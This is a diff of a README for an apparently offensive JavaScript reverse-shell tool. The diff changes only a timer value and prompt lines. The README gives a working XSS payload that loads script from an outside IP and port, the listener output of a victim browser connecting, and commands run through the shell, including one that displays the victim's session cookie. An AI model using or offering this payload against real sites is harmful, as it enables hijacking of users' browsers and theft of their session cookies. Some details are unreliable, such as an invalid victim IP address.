@@ -35,7 +35,7 @@ README.md   js.py
                       v1.0
 
 Payload:
-<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>
+<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},999)>
 
 Listening on [any] 4848 for incoming JS shell ...
 ```
@@ -53,7 +53,7 @@ Access the page and now we will see that we have got the reverse JS shell:
                       v1.0
 
 Payload:
-<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>
+<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},999)>
 
 Listening on [any] 4848 for incoming JS shell ...
 Got JS shell from [75.433.24.128] port 39154 to DESKTOP-1GSL2O2 4848
@@ -73,13 +73,13 @@ Now let's execute some commands:
 ```
 $ var test = 'hacked'
 $ alert(hacked)
-
+$
 ```
 And the browser got an alert:  `hacked`
 
 ```
 $ prompt(document.cookie)
-
+$
 ```
 And the browser print the user cookies:  `JSESSION=3bda8...`
 
